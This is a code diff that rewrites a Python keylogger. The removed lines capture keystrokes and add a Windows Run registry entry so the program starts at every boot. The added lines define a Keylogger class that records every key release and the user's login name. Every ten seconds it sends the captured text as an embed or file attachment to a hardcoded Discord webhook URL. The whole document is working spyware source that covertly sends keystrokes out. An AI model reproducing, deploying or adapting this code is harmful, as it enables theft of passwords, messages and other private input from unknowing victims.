@@ -1,32 +1,68 @@
-import pynput
-from pynput.keyboard import Key, Listener
-from discord_webhook import DiscordWebhook
-import winreg
-import sys
+import keyboard,os
+from threading import Timer
+from datetime import datetime
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
-webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)
-registry_name = 'Simple Discord Webhook Keylogger'     # Registry name for system startup execution
-keys_buffer = ''     # Create empty buffer variable *leave as it is*
+SEND_REPORT_EVERY = 10
+WEBHOOK = "https://discord.com/api/webhooks/1373717070029525002/8x_KinHSaYtBQv256QUwcFT4wV49DbHxbANQJF0n-hLTqXAqbB6s2dZbL7IJkrF7H8Rl"
 
-winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")     # Create registry key for automatic program execution after system startup
-registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)     # Open key for entry
-winreg.SetValueEx(registry_key, registry_name, 0, winreg.REG_SZ, sys.argv[0])     # Creating entry
-winreg.CloseKey(registry_key)     # Close key
+class Keylogger: 
+    def __init__(self, interval, report_method="webhook"):
+        now = datetime.now()
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.username = os.getlogin()
 
-def send_message(message):
-    DiscordWebhook(url=webhook_url, content=message).execute()     # Send message using Webhook
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
 
-def on_press(key):     # Executes on each key pressed
-    global keys_buffer
-    if str(key)[:4] == 'Key.':     # Check if pressed key is not number, letter or character
-        key = ' `[' + str(key) + ']`'
-    else:
-        key = str(key)[1]
-    if len(keys_buffer) + len(key) >= 1975 or key == ' `[Key.enter]`':     # Check if keys_buffer exceeds Discord's 2000 characters per message limit or ENTER is pressed
-        send_message(keys_buffer + key)     # Send logged keys on Discord channel
-        keys_buffer = ''     # Reset keys_buffer to log new key presses
-    else:
-        keys_buffer += key     # Concatenate new logged key presses to make it look simpler
+    def report_to_webhook(self):
+        flag = False
+        webhook = DiscordWebhook(url=WEBHOOK)
+        if len(self.log) > 2000:
+            flag = True
+            path = os.environ["temp"] + "\\report.txt"
+            with open(path, 'w+') as file:
+                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                file.write(self.log)
+            with open(path, 'rb') as f:
+                webhook.add_file(file=f.read(), filename='report.txt')
+        else:
+            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+            webhook.add_embed(embed)    
+        webhook.execute()
+        if flag:
+            os.remove(path)
 
-with Listener(on_press=on_press) as listener:
-    listener.join()     # Start the listener                                                                                             
+    def report(self):
+        if self.log:
+            if self.report_method == "webhook":
+                self.report_to_webhook()    
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
+    keylogger.start()                                                                                       
